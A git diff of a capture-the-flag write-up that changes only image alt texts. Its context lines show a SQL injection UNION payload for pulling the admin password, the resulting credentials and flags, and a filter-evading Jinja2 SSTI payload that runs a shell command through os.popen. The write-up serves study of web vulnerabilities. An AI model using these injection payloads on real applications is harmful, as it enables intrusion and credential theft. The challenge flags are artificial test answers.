@@ -38,7 +38,7 @@ We will try to uncover the admin's credentials.
 
 ![First look](assets/first_look.png)
 
-![login](assets/login.png)
+![Login form](assets/login.png)
 
 
 ### Get tables and collums name
@@ -71,7 +71,7 @@ You get : `redpanda-master`
 ### Get user's password
 `' UNION SELECT password FROM users WHERE is_admin=true-- -`
 
-![password](assets/password.png)
+![User Password](assets/password.png)
 
 
 You get : `61983636aae8819f9a94b39bd0e6219d2212f0bcc37bb11032b559d6df26b07f`
@@ -83,7 +83,7 @@ We use the login form to login :
 `redpanda-master`
 `redpandas4ever`
 
-![password](assets/admin.png)
+![Admin panel](assets/admin.png)
 
 
 > NBCTF{Y0u're_Th3_TrU3_redpanda-master_You've_Been_B0rn_T0_B3_An_Adm1n}
@@ -106,7 +106,7 @@ When inputing `{{7*7}}` in the text box, we get the following result : `Hello, r
 
 We can see the 49, so our ssti is working, let's exploit it.
 
-![password](assets/simple-ssti.png)
+![Simple SSTI](assets/simple-ssti.png)
 
 
 ### Filters
@@ -132,7 +132,7 @@ We can see there is `.`, `'` and `_` in the payload we got to remove :
 
 Final payload : `{{lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("get")("os")|attr("popen")("cat flag\x2etxt")|attr("read")()}}`
 
-![password](assets/nice-ssti.png)
+![Final SSTI](assets/nice-ssti.png)
 
 > NBCTF{Fr0m_Adm1n_0n_W3bSite_T0_Us3r_0n_S3rver_SSTIs_are_FUN!}
 
